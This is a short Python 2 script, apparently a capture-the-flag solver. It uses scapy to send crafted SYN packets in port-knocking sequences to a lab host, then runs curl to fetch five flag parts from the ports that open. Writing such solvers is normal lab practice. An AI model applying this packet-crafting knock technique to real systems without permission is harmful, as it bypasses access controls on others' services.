#!/usr/bin/python

from scapy.all import *
import random
import requests

conf.verb=0

base_URL = "http://10.13.37.23:"

def knock(ports):
    print "[*] Knocking on ports"+str(ports)
    for dport in range(0, len(ports)):
        ip = IP(dst = "10.13.37.23")
        SYN = ip/TCP(dport=ports[dport], flags="S", window=14600, options=[('MSS',1460)])
        send(SYN)

def get_flag_part(port,part):
    command = ["curl", "-s" ,base_URL+str(port)+"/"+part+"_part_of_flag"]
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    result = p.communicate()[0]
    return result.strip()

flag=''

ports = [9264,11780,2059,8334]
port = 24931
knock(ports)
flag_part = get_flag_part(port,"first")
flag = ''.join([flag,flag_part])
print flag_part

ports = [42304,53768,3297]
port = 19760
knock(ports)
flag_part = get_flag_part(port,"second")
flag = ''.join([flag,flag_part])
print flag_part

ports= [23106,4250,62532,11655,33844]
port=3695
knock(ports)
flag_part = get_flag_part(port,"third")
flag = ''.join([flag,flag_part])
print flag_part

ports= [49377,48116,54900,8149]
port=31054
knock(ports)
flag_part = get_flag_part(port,"fourth")
flag = ''.join([flag,flag_part])
print flag_part

ports= [16340,59991,37429,60012,15397,21864,12923]
port=8799
knock(ports)
flag_part = get_flag_part(port,"last")
flag = ''.join([flag,flag_part])
print flag_part
print "Flag: %s" % flag
